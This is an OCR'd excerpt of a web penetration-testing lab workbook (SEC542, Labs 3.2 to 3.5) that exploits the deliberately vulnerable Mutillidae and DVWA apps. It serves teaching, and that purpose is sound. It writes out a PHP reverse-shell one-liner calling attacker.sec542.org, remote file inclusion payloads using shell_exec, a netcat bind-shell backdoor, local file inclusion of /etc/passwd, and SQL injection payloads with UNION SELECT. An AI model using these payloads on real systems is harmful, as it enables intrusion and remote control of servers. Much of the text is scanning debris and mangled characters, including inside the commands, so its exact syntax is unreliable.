'-" 
The shell has connected into the listener. 
'-" 
'--'" 
Be sure to press Ctrl-C after you finish to drop the shell. Otherwise, Mutillidae might seem unresponsive 
the next time we try to use it. 
You may be wondering: What if netcat is not installed on the web server (or is installed, but is missing the 
"-e" flag)? Great question! There are many options. 
Pentestmonkey.net has an amazing reverse shell cheat sheet.' with examples in many languages. PHP is 
commonly available, so let's use that. If you would like to try this, exit the netcat listener and restart it. 
~~- -lvvnp 1337 
Then type the following in the DNS lookup form (there will be a warning, which is harmless). We have 
copied this syntax (along with other useful backdoors) to /home/student/backdoors.txt if you would like 
to copy and paste the PHP syntax below (in that case, be sure to type "sec542.org;" first, and then paste 
the PHP command). 
sec542.org; php -r 
'$sock=fsockopen("attacker.sec542.org",1337);exec{"/bin/sh -i <&3 >&3 
2 >&3 II} ; l 
Note: The previous command should be entered as a single line. 
lgnorethewarning"/bin/sh: 0: can't access tty; job control turned off" 
'-' 
'-" 
'-' 
'--' 
'--' 
'../ 
'-../ 
'-" 
'--' 
.__,., 
'---" 
'--' 
'-" 
'--' 
'--' 
'--' 
'../ 
'-" 
'-' 
'--' 
~ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
10 
'-._., 
'../ 
In the following screenshot, notice the change in privilege (student before backdoor and www-data after). 
While not explicitly referenced in the lab, this was added to make the backdoor more obvious. Also notice 
the more subtle change in the prompt from"["']$" to"$". 
- + 
X 
ftle 
whoami 
1 ..... .....,.. ........... 
student 
, [-1$ nc -lvvnp 1337 
listening on [any] 1337 
connect to [127. 6 .6. 6] from (UNKNOWN) [127. 0.0.1] 52853 
/bin/sh: 0: can't access tty; job control turned off 
$ i~~.t~ •·· I 
111 
·- 
, u1d=33 (www-data). gid=33(www-data) groups=33(www~data} 
$ I 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.2: Command Injection 
11 
,.....__ 
,-... 
,.....__ 
zt 
,,......__ 
,---.._ 
~ 
,---.._ 
,---.._ 
,---.._ 
,.-._ 
,,......__ 
,---.._ 
,---.._ 
,---.. 
,...._, 
,-,. 
,.-._ 
,---.._ 
,,......__ 
,-,. 
,...._, 
,---.._ 
,---.._ 
,---.._ 
,.-._ 
,---.._ 
,-... 
,---.._ 
,.-._ 
,---.._ 
,---.._ 
,---.._ 
,---.._ 
,---.._ 
,-... 
,---.._ 
,---.._ 
,.....__ 
,-... 
peJuoJ ::i1J3 pue Jeuas11111 Lilas 8 ~oz:@ - Z:179J3S 
sa.1uaJa/aHI 
- ~ 
- 
- 
- 
- 
~ 
-~ 
- 
- 
. 
- 
- 
•~e11:~(s0-73_~3:~;_ lq_~ittffRemvote_j'Jle l11~l11.sicit1. -~~- 
- 
- ~ 
- ~ 
~ 
= - 
~- - 
- -~z__:: 
"- 
- ;;::_~- 
~ 
:;~ 
- 
I Objectives 
• 
Gain hands-on familiarity with discovery and exploitation of Local File Inclusion (LFI) flaws 
• 
Work with Remote File Inclusion (RFI) flaws 
• 
Host PHP code on an attacker-controlled system and use a Remote File Inclusion (RFI} exploit to load 
and run it on a victim 
• 
Work with static web server to quickly host payloads 
!Lab Note 
We have set up the/ etc/hosts file entry 'attacker.sec542.org', which points to 127.6.6.6. We did this 
to help keep the attacker and victim elements of this lab clearer. If you yearn to attack a 'real' remote 
system, you're in luck! 542.6 contains systems you will hack via a live network. 
!Lab Setup 
Open Firefox and go to Exercises toolbar -> Mutillidae 
Click the Mutillidae "Home" button: 
OWASP MutiUidae II: Web Pwn in Mass Production 
\. 
Video Tutorials 
Pay careful attention to the URL in the address bar: 
mutillidae/!nd 
• f' Mutillldae 
bWAPP IIDVYVA 
Note: If Mutillidae becomes slow or unresponsive, quit Firefox and restart. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
1 
'-' 
llenge: No Hints 
'---" 
\.....; 
Local File Inclusion {LFI) 
• 
Identify a potential LFI vulnerability in Mutillidae. 
• 
Exploit the LFI vulnerability to display any local file. 
Remote File Inclusion (RFI) 
Build RFI attack payloads: 
• 
Write PHP code that runs a local shell command on the victim and displays the output. 
• 
Write a second PHP script that opens a backdoor shell listener. 
Host attack payloads from attacker.sec542.org running on port 1337: 
• 
Load and run via an RFI exploit. 
• 
Connect to the backdoor listener. 
You may stop here and attempt these steps or read ahead for step-by-step instructions. Students with 
LFI/RFI experience may want to attempt these challenges without hints: It's your call. 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
'-" 
\.....; 
'-" 
'-../ 
\.....; 
\.....; 
\.....; 
\.....; 
\.....; 
\.....; 
'-../ 
\.....; 
\.....; 
\.....; 
\.....; 
'-../ 
\____,, 
\.....; 
\.....; 
'-' 
\.....; 
\.....; 
\.....; 
'-../ 
\.....; 
\.....; 
'-../ 
\.....; 
'-../ 
·..__; 
'---" 
'-" 
'-" 
'-../ 
'-" 
\____,, 
2 
\.....; 
'-' 
\____,, 
!step-by-Step instructions 
Local File Inclusion {LFI} 
Pay careful attention to Mutillidae's Home screen's address bar: 
mutillldae/1 
l)DVWA 
Take note of the "page=" parameter: Change it to display a local file of your choice. 
We know that/ etc/passwd exists on most every UNIX/Linux server. 
Change the Home address bar to: 
http://mutillidae/index.php?page=/etc/passwd 
Then load the page. 
Payl>a!. 
way to pay online! 
Want to Help? 
' 
1;i/ili 
Video Tutorials 
root:x:0:0:root:/root:lbin/bash da,emon:x:1:1:daemon:/usr/sbin:/usr/sbrn/nologin 
bin:x:2:2:bin:/bin:/usr/sbln/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologln 
sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologrn 
man :x:6: 12 :man:/var/cache/man:/usr/sbin/nologin !p:x: 7: 7 :lp:Jvar/spool/lpd:/usr 
/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news: 
/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbh,/nologin www-data:x:33:33:www-data:/var/www:/usr 
/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mamng 
list Manager:/var/list:/usr/sbin/nofogin irc:x:39:39:ircd:/Var/run/ircd:/usr/sbin/nolog:in 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/Ilb/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin Ubuuid:x:100:101::/Var 
/lib/iibuu!d: syslog:x:101:104::/home/syslog:/bintfalse messagebus:x:102:106::/Var 
/rnn/dbus:/bin/false usbmux:x:103:46:usbmux daemon,,.:/home/usbmux:/bin/false 
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/ralse avahi-autolpd:x:105:113:Avahi 
autoip daemon,..:/var/lib/avahi-autoipd:/bin/false kemoops:x:106:65534:Kemel Oops 
Tracking Daemon.,.:1:/bin/false rtkit:x:107:114:RealtimeKit,..:/proc:/bin/false 
saned:x:108:115::/home/saned:/bin/false whoopsie:x:109:116::/nonexistent:/bin/false 
speech-dispatcher:x:110:29:Speech Dispatcher ;.;:/Var/run/speech-dispatcher:/bin/sh 
avahi:x:111:117:Avahi mDNS daemon.,.:/var/run/avahl-da,emon:/bin/false 
lightdm:x:112: 118:Llght Display Manager:/Var/lib/llghtdm :/bin/false 
colord:x:113:121:colord colour management da.emon..,:/Var/llb/Colord:/bin/false 
hp!ip:x: 114: 7:HPLIP system user,,,:/var/run/hpltp:/bin/fa lse pulse:x: 115: 122:PulseAudio 
daemon, .• :/Var/run/pulse:/bin/fa!se student:x:1000:1000:Student,.:/home/student: 
~ 
Feel free to freestyle and view other files. 
If you are thinking, that is so easy, you are correct. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
3 
r'\ 
r'\ 
" 
17 
,-, 
~ 
~ 
r'\ 
" 
" 
" 
r'\ 
r'\ 
r---. 
r'\ 
" 
" 
,...---, 
r---. 
---- 
---- 
r---. 
r---. 
r---. 
r'\ 
~ 
,-, 
" 
"' 
" 
"' 
r'\ 
,...---, 
" 
" 
r'\ 
"' 
" 
" 
" 
~ 
~ 
uorsnpu] 81!::l aiowa~/I8:)0l :n: qe1 
peJUOJ :)IJ3 pue JeuaSllfll Lilas 8WZ:@- Z:v9J3S 
·:i.xau uojdxa (l:ltl) uoisnpuj i31!:l aiowati e W.JOJ.Jad pue A:i.1nJ!JJ!P a4:i. dn duier aM 
jauoAue 11a:i. a.uop asea1d 
·Asea s,l! 'seuiuaurog ::i.anas ~,q s,~u,:i.sa:i. uoue.uauaj 
Remote File Inclusion (RFI) Overview 
Note: For the purpose of this lab walkthrough, Mutillidae and the PHP script will be on the same system. 
To make it easier to differentiate attacker from victim, we will leverage the hostname attacker.sec542.org 
and use a static web server to serve up our attack payloads. 
If you haven't worked with Remote File Inclusion flaws before, they can seem a bit confusing. At a high 
level, here are the basic steps we will be performing. 
• 
Write a PHP script (we call it id. txt) that can run the id shell command 
Note: Even though it is PHP code, we intentionally avoid using the .php extension to ensure that the attack 
web server we are using to host the file doesn't execute the script when the victim fetches it. 
• 
Place id.txt in your home directory /home/ student 
• 
Serve files in /home/student on port 1337 using a Python static web server (python3: http.server 
or python2: SimpleHTTPServer) 
• 
Then have Mutillidae load and execute it via 
http://attacker.sec542.org:1337/id.txt 
,,.---., 
The PHP shell exec function is well suited for our nefarious purposes. 
This simple PHP script executes the shell command of your choice: 
<?php 
echo shell_exec('<command>'}; 
?> 
Note: You can write the PHP code as a single line: 
<?php echo shell_exec('<command>'); ?> 
,,....__ 
Writing it on multiple lines makes it easier to read and also makes adding additional commands easier. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
5 
Create /home/student/id.txt 
Use gedit to create the file: 
txt 
Enter the PHP code: 
Save the file and exit. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
.___, 
'---' 
'-' 
'---' 
'---' 
.,,____,, 
'---' 
'-.,./ 
'-.,./ 
'---' 
'---' 
'---' 
'---' 
'-../ 
'--' 
'--' 
'---' 
'-..../ 
'---' 
'----' 
'----"' 
'--' 
'---' 
'----"' 
'-' 
'---' 
'---' 
'-' 
'---' 
'----' 
'-' 
.___, 
'---' 
'---' 
'----' 
'---' 
'-.../ 
.___, 
'---' 
'-../ 
6 
'---' 
'---' 
'---' 
Serve the Payloads 
We will serve files in /home/student on port 1337 using a Python static web server. 
In a terminal run the following: 
$ cd /home/student 
python3 
Note: In the previous commands, we are using a Python 3's (python3) module (-m http. server) to 
serve files in the current directory (/home/student) on port 1337. Alternatively, we could have used 
Python 2's SimpleHttpServer module. 
Terminal Tabs 
f[-1$ python3 -m http.server 1337 
!Serving HTTP on 0 .. 0. 0. 0 port 1337 ... 
II 
Leave the terminal in this state so it will continue to serve up /home/student throughout the rest of the 
exercise. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
7 
Launch the RFI 
In Firefox, click Mutillidae's Home button: 
'ASP Mutillidae II: Web Pwn in 
Video Tutorials 
Now change the address bar to: 
http:/ /mut.illidae/index.php?page=http://attacker.s.ec542 .org:1337 /id. 
The page parameter now instructs Mutillidae to serve up the contents of the file located here: 
http://attacker.sec542.org:1337 /id.txt 
Load the page: 
ui.d=33(www-data) gid=33(www-data) groups=33(www-data) 
We now see the output of the id command. 
Here is a slightly snazzier version of the id.txt script, which you can try on your own: 
<?php 
$command= ' id' ; 
echo "Running the '$command' command:"; 
$output=shell_exec($command}; 
echo "<pre>$output</pre>"; 
?> 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
'--../ 
'-" 
'-.../ 
'-" 
'-" 
.._,, 
'-" 
'--- 
'-..,I 
'--../ 
'-" 
'-.../ 
.._,, 
.._,, 
'--' 
.._,, 
'-..,I 
'---' 
'---' 
'----' 
'----' 
'-..,I 
.._,, 
'----' 
.._,, 
.._,, 
'----' 
'----' 
'----' 
.._,, 
.._,, 
.._,, 
"--' 
'-" 
"--' 
.._,, 
'-..,I 
.._,, 
.._,, 
.._,, 
8 
.._,, 
'----' 
\.J 
Snazzier version as code in /home/student/id.txt: 
<?php 
$command;:;;' id' ; 
echo "Running the '$command' command:": 
$output""shell_exec($command); 
echo "<pre>$output</pre>"; 
?>I 
Snazzier version of id RFI rendered: 
{+) CD mutillldae!imiex.php?page=http:/!attacker.sec542.org:1337!ld.txt 
~ 
(1 ! f. No Pro>:yv 
½:...,,,•' 
~-~ """-- -' 
~ OWAS-P Mutillidae U: Web Pwn in Mass 
Proi:luc.tion 
Version: 2,6.58 
Security Level: 0 (Hosed) 
Hints; Enabfed (1 • Try easier) 
Not L~ 
In 
Running the 'id' command: 
uid=33-(w.w1-data) gid=33 (w.w1-data) grnups=33(www-data) 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
9 
'--' 
Create a backdoor 
Let's create a backdoor listener via PHP. 
'----' 
'---" 
Use gedit to create the file: 
'-----' 
I$ gedit /home/student/shell.txt 
'-./ 
'--' 
'-./ 
Enter the PHP code: 
'---" 
'-" 
<?php 
echo shell exec('nc -1 -p 4242 1-e /bin/bash'); 
?> 
Note: The first nc flag is a lowercase L, not a one . 
.,,. 
Ale 
Edit Vlov 
.<?php 
iecho shell exec('nc -l -p 
?>I 
- 
Plarn 
... 
l ) • 
-e 
. 
I 
Save the file and exit. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
'--' 
'-./ 
'-../ 
'-../ 
'-" 
'-../ 
'---" 
'-../ 
'---" 
'---" 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'---" 
'---" 
'-../ 
'---" 
'---" 
'---" 
'-../ 
'-...,· 
'-../ 
'---" 
'---" 
'---" 
10 
'-.../ 
'-.../ 
'---" 
Run the Backdoor 
In Firefox, click Mutillidae's Home button: 
- .. OWASI' MutHHdae n: Web Pwn inMass.l'roduction 
Version: 2.6.50 
Security Level: 0 (Hosed) 
Hints: Enabled (1 • Try easier} 
1 What Should I Do? 
,IL 
y 
Video Tutorials 
Now change the address bar to: 
http://mutillidae/index.php?page=http://attacker.sec542. 
Load the page. 
Note: The page will not complete loading because it is now running a backdoor for us to connect into. 
Next, open a terminal and connect to the backdoor listener by typing: 
I $ nc www.sec542.org 4242 
Note: There will be no banner; start typing commands. For example, you might try the command "uname 
- a II to determine what version of Linux the victim is running. 
Connect to the backdoor and type shell commands: 
X 
iiEerclses"' f Mutt[ "' 
Terrnlnal 
Tabs 
- + X 
I - I$ nc \vww 
.. sec542. o rg 4242 
"d id=33 (WW\v-data) gid=33 (Mv\-1-data) groups;;;;33 (\<JWW-data} 
name - a 
p) 
Not Logged In 
inux Security542 3.13.0-108-generic #155-Ubuntu SMP 
Wed Jan 11 16:57:06 UTC 2017 1686 i686 1686 GNU/Linux 
I 
x.1 Ma.ss 
I 
-;, 
ew 
-~\l'iew Captured 
Lllg 
- : 
- Data - 
Note: Check the previous Mutillidae command injection lab (see the notes of the page titled "Our shell") 
for non-netcat shell options. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
11 
'-' 
We have successfully exploited both local and remote file inclusion vulnerabilities in Mutillidae. That wraps 
up this exercise. 
When you finish typing the commands you want, press Ctrl-C to stop the shell. 
'-' 
'---" 
'--' 
'--' 
'--' 
'-' 
'-' 
'---" 
'---" 
_____, 
'-' 
·-____, 
'-' 
_____, 
'--' 
'-....., 
'-../ 
'-..,/ 
'--' 
\.__./ 
'-..,/ 
'--' 
'--' 
\.__./ 
'-./ 
.'-..,/ 
'--' 
'--' 
'--' 
\.__./ 
\.__./ 
'-./ 
\.__./ 
\.__./ 
'-' 
'-' 
'-./ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.3: Local/Remote File Inclusion 
12 
'---" 
'-./ 
'--' 
' - .. I JJ;xef;~isere.i:;_ ~nro~-Base'fi ,SfJJii .• 
·. ~. 
••••·••••• 
. 
-~=: " 
- - --~ 
- 
- - ~ 
- 
? 
~ 
-- 
~ - 
- - 
- 
- 
- - ""--- 
_- 
~ 
::- 
~ 
I Objectives 
• 
Get hands-on experience with SQL injection flaws and attacks 
• 
Manual discovery of SQU flaws 
• 
Eliciting DB error messages 
• 
Determining proper syntax to avoid errors 
• 
Data exfiltration both with and without employing SQL comments 
!Lab Setup 
In this exercise, you work through testing an error-based SQL injection flaw in Sirius Cybernetics 
Corporation's Employee Phone Lookup application. 
Open Firefox and navigate to http://www. sec542. org/ sqli .php 
The page should look like this: 
- - - 
Sirius Cybernetics Corporation 
Employee Phone Lookup: 
11 
I ,-1 
.s-u-bm-
. i!-it-Qu_e_ry~ 
•.... I 
Please provide a Sirius Corp employee's last name 
(e.g. Dent). 
The simple employee lookup page presents a form. The text on the page suggests that it expects a last 
name and provides an example of Dent. 
Enter Dent in the form and click Submit Query. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.4: Error-Based SQLi 
1 
'----' 
Please provide a Sirius Corp 
employee's last name (e.g. Dent). 
'-" 
'-" 
Review the results that are presented. 
Employee Information 
Name: Arthur Dent 
Phone: (555) 867-5309 
Name: Random Dent 
Phone: (301) 951-0104 
Don't forget to try out the latest 
model of our Happy Vertical 
Transporter. 
We find two records were returned providing a full name and phone number. 
We also see a rather disturbing note about something called a Happy Vertical Transporter. What kind 
of sick organization is this? 
!chali~~ 
Hints 
Target: http://www. sec542. org/ sqli. php 
Interact with the target page and perform the following tasks: 
• 
Provide input that triggers a DB error message 
• 
Return all rows from the current table using a comment 
• 
Now, return all rows without using a comment 
• 
Leverage ORDER BY to determine number of columns 
• 
Expose the current query by showing the info column of the processlist table in the 
information schema database 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.4: Error-Based SQLi 
'---' 
'----' 
'---' 
'--' 
'----' 
'---' 
'---' 
'-' 
'---' 
'----' 
'---' 
'-' 
'---' 
'-' 
'----" 
'----' 
'----' 
'---' 
'---' 
'---' 
'----' 
'---' 
'---' 
'---' 
'---' 
'-.J 
'-' 
'---' 
'---' 
'-..,/ 
'-..,/ 
'---' 
.____, 
'-' 
'-..,/ 
'-' 
2 
'---' 
'-' 
'--' 
[step-by-Step Instructions 
Induce an Error Message 
Firefox should be open to http: //www.sec542.org/sqli .php. 
Add a single quote to benign input (Dent') in the form, and then click Submit Query: 
Now review the resultant error message. 
You have an error in your SQL syntax; check the manual that 
corresponds to your MySQL server version for the right 
syntax to use near "Dent'" at line l 
Our input has caused MySQL to throw an error message. The message shows our input and a bit of 
surrounding text associated with the error we induced. 
Looks like we caused an issue with misbalanced quotes. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.4: Error-Based SQLi 
3 
Return All Rows Using Comments 
It feels like input is being passed to a WHERE clause. 
Submit the following as form input: 
The OR 1=1 subverts the logic of the WHERE to always yield TRUE. The (;) ends the SQL statement and 
the # comments out the rest of the SQL to avoid the syntax error we encountered previously. 
Name: Zaphod Beeblebrox 
Phone: {844) 387-6962 
Name: Arthur Dent 
Phone: (.555) 867-5309 
Name: Ford Prefect 
Phone: (.5.55) 337-1337 
Name: Marvin The Paranoid Android 
Phone: (.555) .542-4242 
Name: Tricia McMillan 
Phone: (301) 654-7267 
Looks like we dumped all the entries available to this query. Note the resultant URL has characters that 
had to be URL encoded. We're not going to do anything with that now, but it is worthwhile to get used to 
doing some encoding of payloads. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.4: Error-Based SQLi 
'---' 
'--' 
'--' 
'--' 
'-./ 
'-./ 
'-./ 
'-./ 
'-' 
'-./ 
'-' 
'-./ 
'--' 
'-' 
'-./ 
'-' 
'--' 
'--' 
'-' 
'-..../ 
'---' 
'- 
'-' 
'--' 
'-' 
'-./ 
'-' 
'-' 
'-./ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-./ 
'-./ 
'-' 
'-./ 
'-" 
'-./ 
4 
\___/ 
'-./ 
'--' 
Return All Rows without Comment 
Although not needed for this scenario, let's yield the same result without leaning on the comment suffix 
appended to our payload. Recall the single quote caused the error because it resulted in unbalanced 
quotes. So, we need to balance the quotes, though not by canceling them out with a comment delimiter. 
Submit the following payload: Dent' OR '1' =' 1 
!vent' OR '1'='1 
q' XL 
Employee Phone Lookn 
Dent' OR 
11
1 
,....__ 
Note: Only four single quotes are in the payload; there is no single quote at the end of the line. 
You should receive the same results as the previous approach. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.4: Error-Based SQLi 
5 
'-" 
Determine Number of Columns Using ORDER BY 
'-" 
'-" 
Having exposed all the data this query is built for, we need to target other tables. The primary method of 
doing this is through the use of UNION SELECT queries. For that to be successful, we must determine 
the correct number of columns in the target query. We can employ the ORDER BY approach. 
We submit payloads that include an ORDER BY targeting successive column numbers. An error means we 
have exceeded the number of columns in the target query. 
Submit each of the following one at a time as input looking for a syntax error: 
Dent' ORDER BY 1;# 
Dent' ORDER BY 2;# 
Dent• ORDER BY 3;# 
Dent• ORDER BY 4;# 
Dent1 ORDER>BY 5;# 
Inputs 1-4 just return data. 
Employee Information 
Name: Arthur Dent 
Phone: (.555) 867-5309 
Input 5 yielded an error, so that means there are 4 columns. 
\...,, 
'-" 
'-J 
'---" 
'---" 
'-./ 
'-" 
'-J 
'-J 
'-J 
'-J 
'-J 
'-./ 
'-/ 
'-./ 
'-./ 
'-./ 
'-J 
'-J 
'-../ 
'-/ 
Unknown column '5' in 'order clause' 
'-J 
'-./ 
.._,, 
'---" 
'-J 
'---" 
'-' 
'-' 
'-J 
'-' 
'-/ 
'-./ 
'-./ 
.._,, 
'-" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.4: Error-Based SQLi 
6 
'-J 
.._,, 
Current Query Disclosure 
The final step is to determine the vulnerable query we are injecting into. Injections against MySQL can 
potentially expose the details of the vulnerable query. We need to use a UNION SELECT building upon 
our knowledge of the number of columns. 
To see the details, we need to display the info column of the processlist table contained in the 
information _schema database. Submit the following to ensure the proper columns and see 
which columns are displayed in the results: 
Dent' UNION SELECT 111,121,131,141;# 
Name: 2 3 
Phone:4 
Columns 2, 3, and 4 all displayed fine. 
Now, submit the following input: 
Dent..' UNION SELECT 111,121,131,info FROM information_schema.processlist;# 
Name: 2 3 
Phone: SELECT * FROM Customers WHERE lname = 'Dent' UNION 
SELECT 'l','2','3',info FROM information_schema.processlist;#' 
We see displayed in the results the full details of the query we just triggered, including our injection: 
SELECT* FROM Customers WHERE lname = 
'Dent' UNION SELECT 
'1','2', 131,info FROM information_schema.processlist;#' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.4: Error-Based SQLi 
7 
• .- "· 
~Cc-_ 
>" Exe~eisli.'5. -·Sqzf11(1p if~ltAif i ·. " ~; 
-_ - 
- .. 
~ 
"- " 
- 
-- 
- 
= 
- 
- 
~ =-- 
~ 
~ 
-=- - 
= 
~ 
~--=- 
:;; - 
,......_ 
I Objectives 
• 
Manually test authenticated blind SQLi flaw using ZAP 
• 
Integrate sqlmap as a ZAP application 
• 
Provide sqlmap authentication information from ZAP 
• 
Leverage sq I map and ZAP together to exploit SQLi flaw 
• 
Gain understanding of many sqlmap capabilities 
,-----.. 
jLabNote 
In this lab, we will have you work with an authenticated blind SQL injection flaw. You will initially test the 
flaw manually with ZAP. Once manual testing is understood, you will then employ sqlmap+ZAP to more 
efficiently exploit the SQLi flaw. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
\._,I 
\_.I 
\_.I 
Launch ZAP by clicking the ZAP icon in the upper panel at the top of the screen: 
\_.I 
'-../ 
'-..../ 
'-..../ 
'--./ 
'-..../ 
'-../ 
'--./ 
'--./ 
'-../ 
'-..../ 
Note: ZAP takes a while to launch, roughly 10 seconds or so. Many students end up accidentally launching 
ZAP two or three times during the delay. Run one instance of ZAP only. 
Multiple instances of ZAP are running if you see this warning: 
In this case, close the additional ZAP instances, leaving the original. When in doubt, close all ZAP instances 
and start over. ZAP must be listening on port 8081 for this lab to work. 
After ZAP starts, launch Firefox by clicking the Firefox icon in the upper panel. 
'-.../ 
'---' 
'--./ 
'-../ 
'--./ 
'-..../ 
'-" 
'-../ 
\._,/ 
'-../ 
'--./ 
'--./ 
\._,/ 
'-...-, 
.._,, 
'-...-, 
'-...,· 
'-../ 
'---' 
'-..../ 
'-..../ 
'--- 
'---' 
Configure Firefox to use the running proxy: 
'---' 
\_; 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
'-../ 
'-.../ 
In Firefox, select ZAP from the Proxy Selector drop-down: 
Ensure ZAP is now chosen as the proxy. 
We have already installed a Firefox extension called Proxy Selector. This enables you to quickly switch 
Firefox between various proxy servers. In this case, we have already configured proxy settings and saved 
them under the name ZAP. To activate the use of ZAP, simply select ZAP from the proxy list on the right 
side of the proxy bar at the top of the Firefox window. 
c"'I 
This pull-down enables you to automatically configure the browser to use a given web app manipulation 
,........._ 
proxy. 
Note: Always use Proxy Selector to manage Firefox's proxy settings. Do not use other methods. 
Changing the system proxy settings can break future labs. Some system proxy settings attempt to proxy all 
protocols, even ICMP! 
c"'\ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
Navigate to http:/ /dvwa/ 
.___, 
..._,, 
Log in with the following credentials: 
• 
Username: admin 
• 
Password: password 
.___, 
'-' 
'-' 
+ 
,I, • 
}} - - - 
m Exerds:es v 
userrsame (oomirt) 
I 
I 
Pas.~wmd (pasSVilt>rd) 
I Login 
J 
..._,, 
'-' 
'-' 
'-' 
'-../ 
..._,, 
'-' 
.___, 
'-' 
•-._, 
'-' 
'---' 
'-' 
'-' 
'---' 
'-' 
'-' 
Once authenticated, click SQL Injection button on the sidebar: 
'-' 
'-' 
'---" 
.___, 
'-' 
'-' 
.___, 
'--' 
.___, 
'-' 
'-../ 
'----' 
.___, 
'----' 
'-- 
'---" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
'----' 
'-./ 
'----' 
I Challenge: No Hints 
Target: http: //dvwa/vulnerabilities/sqli 
• 
Verify the simple error-based SQLi flaw manually with ZAP/browser. 
• 
Execute sqlmap against target using a cookie and proxied through ZAP. 
• 
What injection types does sqlmap find are available to attack the vulnerable id parameter? 
• 
Determine sq I map's default user agent and customize it to use 42 for the UA. 
• 
Without viewing the data, how many records are found in the sensitive Customers table of the 
sqli database? 
• 
Use sqlmap to determine the uid for the zbeeblebrox on the system. 
• 
Dump database users and password hashes. 
• 
What is the name of the column that contains password hashes for the my_ wiki database? 
• 
Bonus: Use sq I map to get a Metasploit shell, and from within the shell, determine the id under which 
the shell is running. 
Step-by-step instructions begin on the next page. 
,,----, 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3.5: sqlmap + ZAP 
-._,/ 
!step-by-Step Instructions 
'-' 
'-' 
Verify SQL Flaw 
'-' 
First, let's confirm the existence of the simple error-based SQLi flaw. 
Submit a valid id of 1, and confirm the application is working appropriately. 
Vulnerability: SQL l:njection 
User ID: 
ID: 1 
First name: adain 
Surname; adeun 
Now, submit a 1 followed by a single quote (l 1 ). 
User ID: 
Notice the DB error message similar to what we have seen previously. 
'-' 
'-../ 
'-../ 
'-..,' 
'-../ 
'-../ 
'-.., 
'-../ 
'-' 
'-..,' 
'-.., 
'-' 
'-' 
'-' 
'-' 
'-../ 
'-../ 
http:/ldwta/vulnernbitiities/sqlif?i:d=1'&Submit=Submit#j 
'-' 
'-' 
bWAPP rlJunvt-i 
'-' 
You have an error in your SQL syntax; 
'-' 
'-' 
'--' 
'-..,,/ 
'-' 
'-' 
'-' 
'-../ 
'-' 
'-../ 
'-' 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 3,5: sqlmap + ZAP 
'-' 
'-' 
'-../ 
ZAP Cookie -> sqlmap 
In ZAP 
Select the GET to sqli with the id submission: GET: sqli (Submit, id). 
You will find this request under 
Sites->http://dvwa->vulnerabilities->GET:sqli(Submit,id). 
"' 
Contexts 
LiJ Default Context 
"'e ~ Sites 
f.\:! http:!!dvwa 
GET: logout. php 
f.l:! GET: login. php 
POST: login, php(Login, password, us 
D f;ii GET:index.php 
In the Request tab on the right, highlight the Cookie value (from PHPSESSID 
... through security=low). 
T 
Sites 
.., 
\fl:/ http://dW1a 
dvwa 
GET:favicon. ico 
fl; GET:index,php 
ft GET:login,php 
POST: login. php(Login, password, username) 
I] 
GET:robots.txt 
" §ft.vulnerabilities 
{..,H_El_ad_1=_r_
: T_e_xt 
__,•J l Body: Text 
GET http:/ /dvwa/vulnerabi li ties/sqli/?id=l%27&Submit=Submi t HTTP/1, 1 
User-Agent: 
Mozilla/5.O (Xll; Linux i686; rv:5O,O) Gecko/201O0101 
Firefox/5O,O 
Accept: text/html, app Li cat icn/xhtn l.+xm l, app l i cat ion/xal : q=O, 9, * /*; q= 
0,8 
Accept-Language: en-us.en.c-a.s 
Referer· 
· 
· 
Cookie: 
Connect 
Upgrade-Insecure-Requests: 1 
Host: dvwa 
Right-click on the highlighted data and select Copy. 
Note: The PHPSESSID you see will be different than the one in the previous image. 
